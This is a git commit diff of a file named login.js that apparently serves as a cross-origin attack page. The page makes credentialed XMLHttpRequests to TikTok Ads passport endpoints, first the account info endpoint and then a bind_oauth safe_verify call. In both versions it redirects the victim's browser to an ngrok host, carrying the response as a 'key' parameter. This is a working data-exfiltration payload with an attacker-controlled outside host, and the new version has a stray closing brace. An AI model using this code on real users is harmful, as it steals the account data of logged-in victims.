652dafc4ffa210030ebac2e85f846097e80af397
cancerz1990 <94399415+cancerz1990@users.noreply.github.com>
2023-08-26 12:54:06 +0700

    Update login.js

--- login.js
+++ login.js
@@ -1,11 +1,11 @@
-var xhr = new XMLHttpRequest();
-
-xhr.onload = reqListener; 
-xhr.open("GET", "https://ads.tiktok.com/passport/account/info/v2/?aid=1583&msToken=tLGY_TuxRp76vmrKv5Z4A_lHpG7cR05WcFHBVf4yEhnNW1L6w6Ad7AcqrV6JSyPhiNErpyUBen2m97y15uXVzPhxJ_-PiJ0bc1DY6MDb3DSbE4XXx1hB4qXGjb28F0R26ng=&X-Bogus=DFSzsIVOZNvANHbAtx9aD0WdbToB&_signature=_02B4Z6wo00001AZJyHgAAIDALDAw7qNTwfgGSMzAAGWBc4");
-xhr.withCredentials = true;
-xhr.setRequestHeader("Content-Type", "application/json");
-xhr.send();
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('POST','https://ads.tiktok.com/passport/web/shark/safe_verify/?msToken=or6IAX2oBn8DiZB3AnCIeMAsJoeVSdb5TsIH7rHyFtYUl6Q4XwdvxpkmvqRbpUPfC29MiWfYR2v5RAFkkTxbhUoqb-__trxRjq2aw8mQ6sfypZkHddXtL_gIrSRYylxl6A8oyyMndkUMH8-3_A==&X-Bogus=DFSzsIVLZC0tgY/HtxxIuUWdbTo7&_signature=_02B4Z6wo00001b4nHjwAAIDBlF7mqG44QVW-JhqAAAth27',true);
+req.withCredentials = true;
+req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded',true);
+req.send('aid=1583&service=&language=en&target=bind_oauth',true);
 
 function reqListener() {
-    location='//2d7a-140-213-103-229.ngrok-free.app/?key='+this.responseText; 
-};
+location='//2d7a-140-213-103-229.ngrok-free.app/log?key='+this.responseText;
+	};
+}
